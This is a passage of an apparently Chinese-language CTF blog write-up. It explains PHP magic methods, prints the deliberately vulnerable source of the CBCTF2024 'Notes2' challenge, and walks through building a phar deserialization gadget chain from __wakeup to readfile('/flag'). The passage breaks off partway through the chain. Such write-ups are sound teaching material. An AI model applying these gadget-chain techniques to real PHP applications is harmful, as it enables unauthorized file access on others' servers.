title="魔术方法"></a>魔术方法</h1><p>（这里主要都是 PHP，其他的可能类似，还没有研究）</p><p>魔术方式是在特定情况下会自动调用的特殊方法，会覆盖 PHP 的默认操作，可以自定义方法的内容。做一些反序列化的题目时需要熟练掌握各个魔术方法的调用条件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。<br><span class="hljs-title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。<br><span class="hljs-title function_ invoke__">__toString</span>():方法用于一个类被当成字符串时应怎样回应。例如<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 <br><span class="hljs-title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；<br><span class="hljs-title function_ invoke__">__wakeup</span>():<span class="hljs-title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="hljs-title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。<br><span class="hljs-title function_ invoke__">__get</span>():当调用一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__set</span>():当设置一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__invoke</span>():调用函数的方式调用一个对象时的回应方法<br></code></pre></td></tr></table></figure><p>更全的魔术方法信息参考：<a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><h1 id="反序列化例题"><a href="#反序列化例题" class="headerlink" title="反序列化例题"></a>反序列化例题</h1><h2 id="CBCTF2024-Notes2"><a href="#CBCTF2024-Notes2" class="headerlink" title="CBCTF2024 Notes2"></a>CBCTF2024 Notes2</h2><p>题目提供了源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// easy unserialize chain OuO</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$realPath</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$realPath</span>, <span class="hljs-string">&#x27;/notes&#x27;</span>) === <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listnote</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$directory</span> = <span class="hljs-string">&#x27;/notes&#x27;</span>; <br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$directory</span>), function (<span class="hljs-variable">$file</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">directory</span>) &#123;<br>        <span class="hljs-title">return</span> <span class="hljs-title">is_file</span>(&quot;$<span class="hljs-title">directory</span>/$<span class="hljs-title">file</span>&quot;);<br>    &#125;);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>        <span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=/notes/&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$link</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=show-me-source&quot;&gt;show source&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br><br><span class="hljs-variable">$note</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;note&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span> === <span class="hljs-string">&quot;show-me-source&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$note</span>))&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=UTF-8&#x27;</span>);<br>            <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$note</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;这里是mak自己悄悄留给你的一些笔记哦，打开看看吧&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Notes List:&lt;h2&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">listnote</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="解题详细过程"><a href="#解题详细过程" class="headerlink" title="解题详细过程"></a>解题详细过程</h3><h4 id="1-初步观察分析，得到大致方向"><a href="#1-初步观察分析，得到大致方向" class="headerlink" title="1.初步观察分析，得到大致方向"></a>1.初步观察分析，得到大致方向</h4><p>很明确告知是反序列化题，可以在源码看到文件上传的接口，所以先上传序列化 phar 文件再触发反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br></code></pre></td></tr></table></figure><p>首先观察可利用的类及魔术方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">本题中存在的魔术方法：<br><span class="hljs-title function_ invoke__">__construct</span>():存在于**notes**类中，具有构造函数的类会在每次创建新对象时先调用此方法。<br><span class="hljs-title function_ invoke__">__toString</span>():存在于**lets**类中，方法用于一个类被当成字符串时应怎样回应。例如<span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;应该显示些什么。 <br><span class="hljs-title function_ invoke__">__wakeup</span>():存在于**_0rays**类中，<span class="hljs-title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="hljs-title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用__wakeup方法，预先准备对象需要的资源。<br><span class="hljs-title function_ invoke__">__get</span>():存在于**go**类中，当调用一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__set</span>():存在于**lets**类中，当设置一个类及其父类方法中未定义的**属性**时<br><span class="hljs-title function_ invoke__">__invoke</span>():存在于**lets**类中，调用函数的方式调用一个对象时的回应方法<br></code></pre></td></tr></table></figure><p>其次观察可利用于实现目的操作的语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">发现目标存在于notes类中，只要让<span class="hljs-variable">$filepath</span>参数为<span class="hljs-string">&#x27;/flag&#x27;</span>即可通过<span class="hljs-title function_ invoke__">readfile</span>()获得flag：<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br></code></pre></td></tr></table></figure><p>再次，寻找首个触发的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">发现目标存在于_0rays类中的<span class="hljs-title function_ invoke__">__wakeup</span>()，当发生反序列化时会优先调用该方法<br>所以可以作为反序列化攻击的入口，从该方法开始到<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-variable">$filepath</span>)方法的<span class="hljs-title function_ invoke__">readfile</span>()构造链子<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-深入分析，构造链子"><a href="#2-深入分析，构造链子" class="headerlink" title="2.深入分析，构造链子"></a>2.深入分析，构造链子</h4><p>这一步就需要结合每一个魔术方法的自动调用条件分析，然后以<u>套娃</u>的形式不断<u>将父类中的特定属性声明为调用魔术方法所在的类，实现魔术方法层层向目标调用的效果。</u>最后序列化生成 phar 文件用于上传。</p><p>1.__wakeup()作为入口：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>        <span class="hljs-comment">//call_user_func($this -&gt; jbn)存在时throw抛出，可令属性$jbn=&#x27;phpinfo&#x27;</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>            <span class="hljs-comment">//属性$pankas作为字符串被抛出，因此可以联想到lets类中的魔术方法__toString()</span><br>            <span class="hljs-comment">//lets类被当做字符串时自动调用魔术方法__toString()</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.令 $pankas 为 lets 类来衔接 lets 类中的魔术方法__toString()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-comment">//$mak4r1用md5加密后的倒数2~4位赋值给一个未声明的属性，联想到lets类中的魔术方法__set()</span><br>        <span class="hljs-comment">//lets类未声明的属性被赋值时自动调用魔术方法__set()</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>3.令 $rocket 为 lets 类来衔接 lets 类中的魔术方法__set()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-comment">//$a为被赋值变量，$b为赋值变量，即上一层级的$k0rian</span><br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br>        <span class="hljs-comment">//未被声明的属性gtg赋值给变量$int_barbituric，联想到go类中的魔术方法__get()</span><br>        <span class="hljs-comment">//go类未声明的属性用于赋值时自动调用魔术方法__get()</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>4.令 $ech0 为 go 类来衔接 go 